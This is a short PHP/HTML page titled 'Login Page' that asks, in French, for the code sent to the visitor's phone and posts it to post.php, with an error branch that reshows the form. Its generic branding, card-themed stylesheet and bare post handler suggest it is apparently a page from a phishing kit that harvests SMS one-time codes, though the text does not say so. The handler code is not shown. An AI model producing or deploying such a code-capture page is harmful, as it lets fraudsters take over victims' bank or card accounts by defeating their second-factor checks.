<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="res/css/card.css">
</head> 
<body>
<header>
    <img src="res/img/log.png">
</header>

<main>

<div class="title">
Confirmation
</div>

    <div class="container"> 
    <div class="text">Veuillez entrer le code envoyé à votre numéro de téléphone pour continuer.</div>
            <form action="post.php" method="post">
            <input type="text" name="otp" required placeholder="Entrez le code">
            <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Code invalide. Veuillez réessayer.</p>';
}
?>
    <div class="col">
    <button type="submit" class="log">Continuer</button>
</div>
</form>
    </div>

</main>
 

</body>
</html>

